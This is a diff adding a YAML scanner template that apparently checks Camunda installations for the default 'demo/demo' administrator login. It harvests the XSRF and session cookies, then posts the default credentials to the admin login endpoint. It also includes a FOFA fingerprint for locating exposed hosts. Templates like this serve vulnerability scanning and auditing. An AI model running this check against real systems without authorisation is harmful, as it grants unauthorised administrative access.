@@ -1,0 +1,26 @@
+id: poc-yaml-camunda-default-login
+info:
+  name: Camunda 默认登录漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: Camunda
+  fofa: Camunda Welcome
+requests:
+- method: GET
+  path: /camunda/app/welcome/default
+  expression: status_code == 200 && contains(headers,"XSRF-TOKEN")
+  output:
+  - regex_match(headers,"Set-Cookie\x3a XSRF-TOKEN=(?P<t1>.*?);")
+  - regex_match(headers,"Set-Cookie\x3a JSESSIONID=(?P<t2>.*?);")
+- method: POST
+  path: /camunda/api/admin/auth/user/default/login/welcome
+  headers:
+    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+    Accept: application/json, text/plain, */*
+    X-Xsrf-Token: '{{.t1}}'
+    Cookie: XSRF-TOKEN={{.t1}}; JSESSIONID={{.t2}}
+  data: username=demo&password=demo
+  expression: status_code == 200 && contains(body,"authorizedApps") && contains(body,"userId\":\"demo")
+variables: {}
+transport: http
